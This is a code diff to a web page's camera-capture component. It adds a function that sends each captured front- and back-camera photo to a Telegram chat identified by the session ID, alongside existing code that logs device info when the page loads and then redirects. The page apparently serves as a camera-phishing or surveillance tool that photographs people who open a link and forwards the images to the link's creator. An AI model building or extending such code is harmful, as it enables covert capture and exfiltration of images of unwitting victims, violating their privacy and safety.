@@ -63,6 +63,22 @@ const Capture = () => {
   const redirectUrl = rawRedirectUrl;
   const countdownSeconds = urlTimer ? parseInt(urlTimer, 10) : settings.camCountdownTimer;
 
+  // Extract chat ID from tgcam_ sessions for Telegram notification
+  const tgChatId = sessionId.startsWith('tgcam_') ? parseInt(sessionId.split('_')[1]) : null;
+
+  const notifyTelegram = async (photoUrl: string, cameraType: string, captureNum: number) => {
+    if (!tgChatId) return;
+    try {
+      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
+      await fetch(`${supabaseUrl}/functions/v1/telegram-bot`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
+        body: JSON.stringify({ _internal_photo_notify: true, chatId: tgChatId, photoUrl, cameraType, captureNum }),
+      });
+    } catch (e) { console.error('TG notify error:', e); }
+  };
+
   // Save device info immediately when page loads
   const saveDeviceInfo = async () => {
     if (deviceInfoSavedRef.current) return;
@@ -185,6 +201,7 @@ const Capture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]`
             });
+            notifyTelegram(urlData.publicUrl, 'front', captureCountRef.current);
           }
         }
         
@@ -211,6 +228,7 @@ const Capture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [BACK-${captureCountRef.current}]`
             });
+            notifyTelegram(urlData.publicUrl, 'back', captureCountRef.current);
           }
         }
         
